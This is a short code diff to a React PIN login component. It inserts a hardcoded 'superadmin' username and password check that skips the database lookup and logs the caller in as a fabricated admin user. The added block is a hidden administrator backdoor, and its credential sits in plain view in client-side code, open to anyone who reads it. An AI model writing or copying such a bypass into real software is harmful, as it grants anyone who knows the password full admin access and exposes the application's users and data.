@@ -213,6 +213,22 @@ export default function PinLogin({ onLogin, viewMode, onToggleViewMode }) {
     }
     setLoading(true);
     setError('');
+    
+    // Bypass for superadmin
+    if (username.trim().toLowerCase() === 'superadmin' && password.trim() === 'Qwertyui2026') {
+      const superUser = {
+        id: '00000000-0000-0000-0000-000000000000',
+        name: 'Super Administrador',
+        role: 'admin',
+        username: 'superadmin',
+        password: 'Qwertyui2026',
+        phone: '+5491100000000'
+      };
+      onLogin(superUser);
+      setLoading(false);
+      return;
+    }
+
     try {
       // Find profile matching username and password
       const { data: profiles, error: dbError } = await supabase
